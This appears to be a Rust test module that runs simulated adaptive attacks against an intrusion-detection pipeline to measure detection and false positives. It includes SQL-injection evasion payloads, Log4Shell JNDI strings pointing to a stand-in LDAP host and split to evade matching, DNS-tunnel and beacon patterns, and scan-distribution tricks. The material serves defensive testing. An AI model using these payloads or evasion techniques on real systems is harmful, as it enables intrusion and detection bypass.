//! Round 2: an *adaptive* adversary.
//!
//! Round 1 (layers A/B) fixed what a naive attacker could do. Round 2 asks
//! what an attacker does who has read the round-1 report: she distributes the
//! scan over many sources, rotates IPv6 addresses inside one /64, randomises
//! flood ports, registers a short domain so a zone-splitting heuristic
//! mis-parses it, pools C2 addresses, turns the beacon jitter up, drips an
//! exploit marker across a long pause, floods the signature engine's flow
//! table, paces a kill chain so each stage expires before the next, and uses
//! address spellings (IPv4-mapped IPv6, link-local) that the ban/protect lists
//! did not canonicalise.
//!
//! Everything is in-process synthetic metadata, same as layers A/B.
//! Scenario IDs: C = adaptive attack, Q = new benign control, K = known limit.

use super::*;
use std::net::Ipv6Addr;

pub(crate) fn v6(s: [u16; 8]) -> IpAddr {
    IpAddr::V6(Ipv6Addr::new(s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7]))
}
/// The protected server's IPv6 address (the sensor owns both families).
pub(crate) fn victim6() -> IpAddr {
    v6([0x2001, 0x0db8, 0, 0, 0, 0, 0, 0x10])
}

fn layer_c_tag(mut o: Outcome) -> Outcome {
    o.layer = "C";
    o
}

fn normal(r: &mut Rng) -> f64 {
    let u1 = r.f64().max(1e-12);
    let u2 = r.f64();
    (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos()
}

fn sig_rule(a: &Alert, needle: &str) -> bool {
    a.detector == "signature" && a.extra.get("rule").and_then(|r| r.as_str()).map_or(false, |r| r.contains(needle))
}

// ---------------------------------------------------------------------
// C: detection evasion
// ---------------------------------------------------------------------

fn c01_distributed_scan() -> Outcome {
    // 240 bots, each touches only 3 ports: every per-source counter stays far
    // below its threshold, but the *target* sees 720 distinct ports in 10 min.
    let mut s = Sim::new();
    for i in 0..240u32 {
        let src = v4(45, 1 + (i / 200) as u8, (i % 200) as u8 + 1, 7);
        for k in 0..3u32 {
            let port = ((i * 3 + k) % 1024 + 1) as u16;
            s.send(src, victim(), 40000 + k as u16, port, L4Proto::Tcp, SYN, &[]);
            s.advance_s(0.83);
        }
    }
    layer_c_tag(detect_outcome("C01", "Distributed low-rate scan (240 sources x 3 ports, 10 min)", "T1046 + evasion (source distribution)", &s, |a| a.detector == "portscan"))
}

fn c02_ipv6_rotation_scan() -> Outcome {
    // One /64, a fresh source address for every probe (privacy-address style).
    let mut s = Sim::new();
    for i in 0..80u16 {
        let src = v6([0x2001, 0x0db8, 0x0bad, 1, 0x1000 + i * 17, 0x2222, 0x3000 + i * 5, 0x4444]);
        s.send(src, victim6(), 40000, 20 + i, L4Proto::Tcp, SYN, &[]);
        s.advance(Duration::from_millis(100));
    }
    layer_c_tag(detect_outcome("C02", "IPv6 scan rotating source address inside one /64 (80 probes / 8 s)", "T1046 + evasion (address rotation)", &s, |a| a.detector == "portscan"))
}

fn c03_random_port_flood() -> Outcome {
    // 4000 forged-source SYNs in 2 s, destination port randomised so no single
    // (ip,port) counter ever approaches its threshold.
    let mut s = Sim::new();
    let mut rng = Rng(0xA5A5_1234_9E37_79B9);
    for i in 0..4000u32 {
        let src = v4(172, 20 + (i % 10) as u8, ((i / 10) % 250) as u8, (i % 250) as u8 + 1);
        let port = 1 + (rng.next() % 65000) as u16;
        s.send(src, victim(), 40000, port, L4Proto::Tcp, SYN, &[]);
        s.advance(Duration::from_micros(500));
    }
    layer_c_tag(detect_outcome("C03", "SYN flood with randomised destination port (4000 SYN / 2 s)", "T1498 + evasion (port randomisation)", &s, |a| a.detector == "synflood"))
}

fn c04_dns_short_domain() -> Outcome {
    // Attacker registers a 3-letter name under a 2-letter ccTLD (abc.io) so the
    // label-length zone guess mistakes the payload label for part of the zone.
    let o = a_dns_tunnel("C04", "DNS tunnel via short domain under a 2-letter ccTLD (x.y.abc.io)", "T1071.004 + evasion (zone mis-parse)", 40, 0.5, |r, _| {
        vec![r.string(B32, 32), r.string(B32, 32), "abc".to_string(), "io".to_string()]
    });
    layer_c_tag(o)
}

fn c05_dns_over_tcp() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x1357_9BDF_2468_ACE0);
    for i in 0..30 {
        let labels = vec![rng.string(B64, 40), rng.string(B64, 20), "evil-example".to_string(), "com".to_string()];
        let msg = dns_query(&mut rng, &labels);
        let mut framed = vec![(msg.len() >> 8) as u8, msg.len() as u8]; // RFC 1035 sec 4.2.2 length prefix
        framed.extend_from_slice(&msg);
        s.send(victim(), resolver(), 45000, 53, L4Proto::Tcp, ACK | PSH, &framed);
        s.advance_s(0.5);
        let _ = i;
    }
    layer_c_tag(detect_outcome("C05", "DNS tunnel carried over TCP/53 (30 queries on one connection)", "T1071.004 + evasion (transport)", &s, |a| a.detector == "dns_tunnel" && a.src_ip == Some(victim())))
}

fn c06_fleet_dns_exfil() -> Outcome {
    // 60 compromised hosts, 12 queries each over an hour to one attacker zone.
    // Per client that is 12 distinct names/hour (alert needs 30); fleet-wide it
    // is 720.
    let mut s = Sim::new();
    let mut rng = Rng(0x0F0F_AAAA_5555_1111);
    for _round in 0..12 {
        for c in 0..60u8 {
            let labels = vec![rng.string(B32, 30), "telemetry-sync".to_string(), "net".to_string()];
            let p = dns_query(&mut rng, &labels);
            s.send(v4(10, 0, 1, c + 1), resolver(), 53000, 53, L4Proto::Udp, 0, &p);
            s.advance_s(5.0);
        }
    }
    layer_c_tag(detect_outcome("C06", "Distributed DNS exfil: 60 hosts x 12 queries/h to one zone", "T1048.003 + evasion (fleet distribution)", &s, |a| a.detector == "dns_tunnel"))
}

fn c07_c2_pool() -> Outcome {
    // 60 s beat, +/-10 % jitter, but each beat goes to a random member of a
    // 20-address pool (all in one /24, typical for a CDN/cloud front).
    let mut s = Sim::new();
    let mut rng = Rng(0xD1B5_4A32_D192_ED03);
    for _ in 0..30 {
        let dst = v4(203, 0, 113, 1 + (rng.next() % 20) as u8);
        s.tcp(victim(), dst, 443, SYN, &[]);
        s.advance_s(60.0 * (0.9 + 0.2 * rng.f64()));
    }
    layer_c_tag(detect_outcome("C07", "C2 beacon rotating over a 20-address pool in one /24", "T1071 + evasion (destination rotation)", &s, |a| a.detector == "beacon"))
}

fn c08_high_jitter_beacon() -> Outcome {
    // 60 s base with +/-80 % uniform jitter (the Cobalt-Strike-style knob).
    let mut s = Sim::new();
    let mut rng = Rng(0x7777_1234_ABCD_0042);
    for _ in 0..48 {
        s.tcp(victim(), c2(), 443, SYN, &[]);
        s.advance_s(60.0 * (1.0 + 0.8 * (2.0 * rng.f64() - 1.0)));
    }
    layer_c_tag(detect_outcome("C08", "C2 beacon: 60 s with +/-80 % uniform jitter (48 beats)", "T1071 + evasion (high jitter)", &s, |a| a.detector == "beacon"))
}

fn c09_sqli_whitespace() -> Outcome {
    let variants: [(&str, &str); 8] = [
        ("newline %0a", "/p?id=1%0aunion%0aselect%0a1,2"),
        ("vertical-tab %0b", "/p?id=1%0bunion%0bselect%0b1,2"),
        ("form-feed %0c", "/p?id=1%0cunion%0cselect%0c1,2"),
        ("MySQL versioned comment", "/p?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2"),
        ("union all(select", "/p?id=1 union all(select 1,2)"),
        ("union(select", "/p?id=1 union(select 1,2)"),
        ("union distinct select", "/p?id=1 union distinct select 1,2"),
        ("hash-comment + newline", "/p?id=1 union%23%0aselect 1,2"),
    ];
    let mut missed: Vec<&str> = Vec::new();
    for (label, path) in variants {
        let mut s = Sim::new();
        s.send(attacker(), victim(), 41000, 80, L4Proto::Tcp, ACK | PSH, &http_get(path));
        if !s.alerts.iter().any(|(_, a)| sig_rule(a, "sqli")) {
            missed.push(label);
        }
    }
    let detail = if missed.is_empty() {
        format!("all {} variants detected", variants.len())
    } else {
        format!("detected {}/{}; MISSED: {}", variants.len() - missed.len(), variants.len(), missed.join("; "))
    };
    outcome("C09", "C", "SQLi UNION SELECT: whitespace / comment / syntax variants (8)", "T1190 + evasion (parser differential)", Expect::Detect, missed.is_empty(), detail)
}

fn c10_log4shell_drip() -> Outcome {
    // A: marker split across a 45 s pause (TCP allows arbitrary gaps).
    let mut a = Sim::new();
    a.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"GET /?x=${jn");
    a.advance_s(45.0);
    a.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"di:ldap://203.0.113.9/a} HTTP/1.1\r\n\r\n");
    let a_hit = a.count(|x| sig_rule(x, "log4shell")) > 0;
    // B: one byte per segment, 2 s apart.
    let mut b = Sim::new();
    for byte in b"GET /?x=${jndi:ldap://203.0.113.9/a} HTTP/1.1\r\n\r\n".iter() {
        b.send(attacker(), victim(), 41001, 8080, L4Proto::Tcp, ACK | PSH, &[*byte]);
        b.advance_s(2.0);
    }
    let b_hit = b.count(|x| sig_rule(x, "log4shell")) > 0;
    outcome("C10", "C", "Log4Shell marker dripped: 45 s pause between halves / 1 byte per segment", "T1190 + evasion (slow drip)", Expect::Detect, a_hit && b_hit,
        format!("45 s pause: {}; byte-drip: {}", if a_hit { "detected" } else { "MISSED" }, if b_hit { "detected" } else { "MISSED" }))
}

fn c11_tail_flush() -> Outcome {
    // The attacker sends a tiny first segment (just the start of the marker),
    // opens 120k unrelated flows to push the half-seen flow out of the
    // signature engine's bounded flow table, then sends the rest. Junk is paced
    // at 100 us so the whole flood fits inside the flow TTL: this isolates
    // *eviction*, not expiry.
    let run = |junk: &'static [u8]| -> bool {
        let mut s = Sim::new();
        s.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"${jn");
        for i in 0..120_000u32 {
            let src = v4(100, 100 + (i / 62_500) as u8, ((i / 250) % 250) as u8, (i % 250) as u8 + 1);
            s.send(src, victim(), 30000 + (i % 30000) as u16, 8080, L4Proto::Tcp, ACK | PSH, junk);
            s.advance(Duration::from_micros(100));
        }
        s.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"di:ldap://203.0.113.9/a} HTTP/1.1\r\n\r\n");
        s.count(|x| sig_rule(x, "log4shell")) > 0
    };
    let plain = run(b"GET /index.html ");
    let crafted = run(b"GET /?q=abcdefgh${");
    outcome("C11", "C", "Signature flow-table flush: 120k junk flows between marker halves", "T1190 + evasion (state exhaustion)", Expect::Detect, plain && crafted,
        format!("plain junk: {}; junk ending in a marker prefix: {}", if plain { "detected" } else { "MISSED" }, if crafted { "detected" } else { "MISSED" }))
}

// ---------------------------------------------------------------------
// Q: new benign controls (the fixes above must not buy detection with noise)
// ---------------------------------------------------------------------

fn q01_popular_server() -> Outcome {
    let mut s = Sim::new();
    for i in 0..400u32 {
        let src = v4(60, 1 + (i / 250) as u8, (i % 250) as u8 + 1, 9);
        let port = if i % 7 == 0 { 22 } else if i % 2 == 0 { 80 } else { 443 };
        s.send(src, victim(), 40000, port, L4Proto::Tcp, SYN, &[]);
        s.advance_s(1.5);
    }
    layer_c_tag(quiet_outcome("Q01", "Benign: 400 distinct clients using ports 22/80/443 over 10 min", "FP check: distributed-scan detector", &s))
}

fn q02_small_vendor_dns() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x2468_1357_ACE0_9BDF);
    for _ in 0..25 {
        for c in 0..3u8 {
            let lbl = rng.string(HEX, 40);
            let p = dns_query(&mut rng, &[lbl, "reputation".to_string(), "vendor-av".to_string(), "com".to_string()]);
            s.send(v4(10, 0, 2, c + 1), resolver(), 53000, 53, L4Proto::Udp, 0, &p);
            s.advance_s(48.0);
        }
    }
    layer_c_tag(quiet_outcome("Q02", "Benign: 3 clients x 25 hashed lookups/h to one vendor zone", "FP check: fleet-level DNS detector", &s))
}

fn q03_cdn_revisit() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x0BAD_CAFE_1234_5678);
    for _ in 0..60 {
        let dst = v4(151, 101, 1, 1 + (rng.next() % 12) as u8);
        s.tcp(victim(), dst, 443, SYN, &[]);
        s.advance_s(-40.0 * (1.0 - rng.f64()).ln());
    }
    layer_c_tag(quiet_outcome("Q03", "Benign: client revisiting 12 hosts of one CDN /24 at random times", "FP check: /24 beacon aggregation", &s))
}

fn q04_human_revisit() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0xFEED_FACE_0DDB_A115);
    for seq in 0..60u8 {
        let dst = v4(192, 0, 2, seq + 1);
        for _ in 0..40 {
            s.tcp(victim(), dst, 443, SYN, &[]);
            s.advance_s(60.0 * normal(&mut rng).exp()); // log-normal, sigma = 1
        }
    }
    layer_c_tag(quiet_outcome("Q04", "Benign: 60 human-like (log-normal) revisit patterns x 40 visits", "FP check: high-jitter beacon test", &s))
}

fn q05_sql_prose() -> Outcome {
    let mut s = Sim::new();
    s.send(attacker(), victim(), 41000, 80, L4Proto::Tcp, ACK | PSH,
        &http_get("/search?q=labor+union,+select+a+representative+at+the+reunion+selection+desk"));
    layer_c_tag(quiet_outcome("Q05", "Benign: prose containing 'union', 'select', 'reunion selection'", "FP check: SQLi matcher word boundaries", &s))
}

// ---------------------------------------------------------------------
// K: known limitations, measured (not scored)
// ---------------------------------------------------------------------

fn known(id: &'static str, name: &'static str, technique: &'static str, detail: String) -> Outcome {
    outcome(id, "C", name, technique, Expect::Known, true, detail)
}

fn k02_out_of_order() -> Outcome {
    let mut s = Sim::new();
    s.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"di:ldap://203.0.113.9/a} HTTP/1.1\r\n\r\n");
    s.advance(Duration::from_millis(5));
    s.send(attacker(), victim(), 41000, 8080, L4Proto::Tcp, ACK | PSH, b"GET /?x=${jn");
    let hit = s.count(|x| sig_rule(x, "log4shell")) > 0;
    known("K02", "Log4Shell halves delivered out of order (TCP reordering)", "T1190 + evasion (reordering)",
        format!("{} -- PacketMeta carries no TCP sequence number, so the engine cannot reorder", if hit { "detected" } else { "not detected" }))
}

fn k03_cross_network_pool() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x5151_5151_ABAB_ABAB);
    for _ in 0..30 {
        let dst = v4(1 + (rng.next() % 200) as u8, (rng.next() % 250) as u8, (rng.next() % 250) as u8, 1);
        s.tcp(victim(), dst, 443, SYN, &[]);
        s.advance_s(60.0 * (0.9 + 0.2 * rng.f64()));
    }
    let hit = s.count(|a| a.detector == "beacon") > 0;
    known("K03", "C2 beacon rotating across unrelated networks (every beat a new /16)", "T1071 + evasion (fast-flux)",
        format!("{} -- per-source periodicity over *all* rare destinations needs flow-level baselining", if hit { "detected" } else { "not detected" }))
}

fn k04_fleet_lookalike() -> Outcome {
    let mut s = Sim::new();
    let mut rng = Rng(0x9999_8888_7777_6666);
    for _ in 0..12 {
        for c in 0..60u8 {
            let lbl = rng.string(HEX, 32);
            let p = dns_query(&mut rng, &[lbl, "rep".to_string(), "vendor-av".to_string(), "com".to_string()]);
            s.send(v4(10, 0, 3, c + 1), resolver(), 53000, 53, L4Proto::Udp, 0, &p);
            s.advance_s(5.0);
        }
    }
    let n = s.count(|a| a.detector == "dns_tunnel");
    let attributable = s.alerts.iter().any(|(_, a)| a.detector == "dns_tunnel" && (a.src_ip.is_some() || a.dst_ip.is_some()));
    known("K04", "AV/EDR cloud-reputation lookups from 60 hosts (looks exactly like C06)", "FP/limit: indistinguishable on the wire",
        format!("{n} zone-level alert(s); attributable to a host: {attributable} -- analyst-facing only, cannot reach containment"))
}

pub(crate) fn layer_c_detect() -> Vec<Outcome> {
    vec![
        c01_distributed_scan(),
        c02_ipv6_rotation_scan(),
        c03_random_port_flood(),
        c04_dns_short_domain(),
        c05_dns_over_tcp(),
        c06_fleet_dns_exfil(),
        c07_c2_pool(),
        c08_high_jitter_beacon(),
        c09_sqli_whitespace(),
        c10_log4shell_drip(),
        c11_tail_flush(),
        q01_popular_server(),
        q02_small_vendor_dns(),
        q03_cdn_revisit(),
        q04_human_revisit(),
        q05_sql_prose(),
        k02_out_of_order(),
        k03_cross_network_pool(),
        k04_fleet_lookalike(),
    ]
}

// ---------------------------------------------------------------------
// C: response / identity / correlation
// ---------------------------------------------------------------------

async fn c13_address_spellings() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 1024);
    // (a) the protected gateway, spelled IPv4-mapped, touches a honeytoken
    let gw_mapped = IpAddr::V6(Ipv6Addr::new(0, 0, 0, 0, 0, 0xffff, 0x0a00, 0x0001)); // ::ffff:10.0.0.1
    p.senders.honeytoken.submit(gw_mapped, "tok-finance-db", None);
    // (b) a real attacker reported by a dual-stack listener as ::ffff:198.51.100.66
    let atk_mapped = IpAddr::V6(Ipv6Addr::new(0, 0, 0, 0, 0, 0xffff, 0xc633, 0x6442));
    p.senders.honeytoken.submit(atk_mapped, "tok-finance-db", None);
    // (c) the IPv6 default gateway's link-local address
    let ll = v6([0xfe80, 0, 0, 0, 0, 0, 0, 1]);
    p.senders.honeytoken.submit(ll, "tok-finance-db", None);
    settle().await;
    let gw_banned = p.quarantine.is_active(gw_mapped) || p.quarantine.is_active(gateway());
    let atk_effective = p.quarantine.is_active(attacker()); // the spelling real packets carry
    let ll_banned = p.quarantine.is_active(ll);
    outcome("C13", "C", "Address spellings: IPv4-mapped IPv6 and IPv6 link-local vs ban/protect lists", "evasion/outage via address canonicalisation",
        Expect::Respond, !gw_banned && atk_effective && !ll_banned,
        format!("mapped gateway banned={gw_banned}; mapped attacker's ban effective on its plain IPv4 form={atk_effective}; link-local gateway banned={ll_banned}"))
}

async fn c14_ipv6_prefix_rotation() -> Outcome {
    let p = pipe(CorrelationConfig::default(), 64);
    for i in 0..100u16 {
        let a = v6([0x2001, 0x0db8, 0x0bad, 1, 0x1111 + i, 0x2222, 0x3333 + i * 3, 0x4444]);
        p.senders.honeytoken.submit(a, "tok-finance-db", None);
        tokio::time::sleep(Duration::from_millis(3)).await;
    }
    settle().await;
    let fresh = v6([0x2001, 0x0db8, 0x0bad, 1, 0xdead, 0xbeef, 0, 1]);
    let blocked = p.quarantine.is_active(fresh);
    let used = p.quarantine.active_count();
    outcome("C14", "C", "IPv6 /64 address rotation after detection (100 addresses, ban table cap 64)", "evasion: ban-by-address vs a /64 of addresses",
        Expect::Respond, blocked && used <= 2,
        format!("unseen address in the same /64 blocked={blocked}; ban-table entries used={used}/64"))
}

async fn c15_paced_kill_chain() -> Outcome {
    // Time-scaled 30:1 -- correlation window 2 s stands in for 60 s; the gap
    // between stages (4 s) stands in for a 2-minute pause.
    let cfg = CorrelationConfig { window: Duration::from_secs(2), sweep_interval: Duration::from_millis(500), ..CorrelationConfig::default() };
    let p = pipe(cfg, 1024);
    let host = attacker();
    p.senders.nsm.submit(host, "portscan", "recon: 60 ports", NSev::Medium);
    tokio::time::sleep(Duration::from_secs(4)).await;
    p.senders.spectral.submit(host, fk(host), 0.55, 0.0); // stage 2: independent lane, moderate anomaly
    settle().await;
    let v = p.metrics.snapshot().verdicts_emitted;
    outcome("C15", "C", "Paced kill chain: recon, pause longer than the correlation window, anomalous flow", "T1595 -> T1071, evasion (stage pacing)",
        Expect::Respond, v >= 1,
        format!("verdicts emitted={v} (an expired recon stage must still corroborate a later independent-lane signal)"))
}

async fn c16_nsm_only_chain() -> Outcome {
    // The attacker evades the ML lanes (mimicry) but trips three *different*
    // NSM detectors on one verified host.
    let p = pipe(CorrelationConfig::default(), 1024);
    let host = attacker();
    p.senders.nsm.submit(host, "portscan", "60 ports", NSev::High);
    p.senders.nsm.submit(host, "signature", "sqli union select", NSev::High);
    p.senders.nsm.submit(host, "beacon", "60 s beacon", NSev::Medium);
    settle().await;
    let v = p.metrics.snapshot().verdicts_emitted;
    let banned = p.quarantine.is_active(host);
    let pending = p.plane.queue().list_pending().len();
    outcome("C16", "C", "ML lanes evaded: portscan + SQLi + beacon (3 NSM detectors) on one verified host", "evasion: adversarial mimicry of the ML lanes",
        Expect::Respond, v >= 1 && !banned,
        format!("verdicts={v}, queued for human review={pending}, auto-banned={banned} (must reach a human, must not auto-ban at this confidence)"))
}

pub(crate) async fn layer_c_response() -> Vec<Outcome> {
    vec![
        c13_address_spellings().await,
        c14_ipv6_prefix_rotation().await,
        c15_paced_kill_chain().await,
        c16_nsm_only_chain().await,
    ]
}
